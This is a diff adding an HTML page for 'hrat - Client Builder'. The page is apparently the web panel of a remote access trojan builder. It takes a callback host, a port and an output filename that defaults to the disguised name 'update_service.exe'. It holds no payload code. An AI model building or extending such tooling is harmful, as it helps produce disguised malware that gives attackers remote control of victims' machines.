@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="ru" class="dark">
+    <head>
+        <meta charset="UTF-8" />
+        <title>hrat - Client Builder</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+        <script src="https://unpkg.com/htmx.org@1.9.10"></script>
+        <style>
+            .htmx-indicator {
+                opacity: 0;
+                transition: opacity 200ms ease-in;
+            }
+            .htmx-request .htmx-indicator {
+                opacity: 1;
+            }
+            .htmx-request.htmx-indicator {
+                opacity: 1;
+            }
+        </style>
+    </head>
+    <body class="bg-gray-900 text-gray-200 font-sans">
+        <div class="container mx-auto p-4 md:p-8">
+            <header class="mb-8">
+                <h1 class="text-4xl font-bold text-blue-400 mt-2">
+                    Client Builder
+                </h1>
+                <p class="text-gray-400">Configure and build new client</p>
+            </header>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div class="bg-gray-800 p-6 rounded-lg shadow-xl">
+                    <h2 class="text-2xl mb-4 font-semibold">
+                        Build Parameters
+                    </h2>
+
+                    <form
+                        hx-post="/build_client"
+                        hx-target="#build-result"
+                        hx-swap="innerHTML"
+                        hx-indicator="#build-spinner"
+                        class="space-y-4"
+                    >
+                        <div>
+                            <label
+                                for="host_ip"
+                                class="block mb-2 text-sm font-medium"
+                                >IP or domain of host</label
+                            >
+                            <input
+                                type="text"
+                                id="host_ip"
+                                name="host_ip"
+                                required
+                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
+                                placeholder="123.45.67.89"
+                            />
+                        </div>
+
+                        <div>
+                            <label
+                                for="port"
+                                class="block mb-2 text-sm font-medium"
+                                >Port</label
+                            >
+                            <input
+                                type="number"
+                                id="port"
+                                name="port"
+                                value="4040"
+                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
+                            />
+                        </div>
+
+                        <div>
+                            <label
+                                for="client_name"
+                                class="block mb-2 text-sm font-medium"
+                                >Filename</label
+                            >
+                            <input
+                                type="text"
+                                id="client_name"
+                                name="client_name"
+                                value="update_service.exe"
+                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
+                            />
+                        </div>
+
+                        <button
+                            type="submit"
+                            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded transition flex items-center justify-center"
+                        >
+                            <span>Build Client</span>
+                            <svg
+                                id="build-spinner"
+                                class="htmx-indicator animate-spin ml-3 h-5 w-5 text-white"
+                                xmlns="http://www.w3.org/2000/svg"
+                                fill="none"
+                                viewBox="0 0 24 24"
+                            >
+                                <circle
+                                    class="opacity-25"
+                                    cx="12"
+                                    cy="12"
+                                    r="10"
+                                    stroke="currentColor"
+                                    stroke-width="4"
+                                ></circle>
+                                <path
+                                    class="opacity-75"
+                                    fill="currentColor"
+                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                                ></path>
+                            </svg>
+                        </button>
+                    </form>
+                </div>
+
+                <div
+                    id="build-result"
+                    class="bg-gray-800 p-6 rounded-lg shadow-xl"
+                >
+                    <div class="text-center text-gray-500">
+                        <p>
+                            Fill out the form and click build
+                            <br />
+                            Result will appear here
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
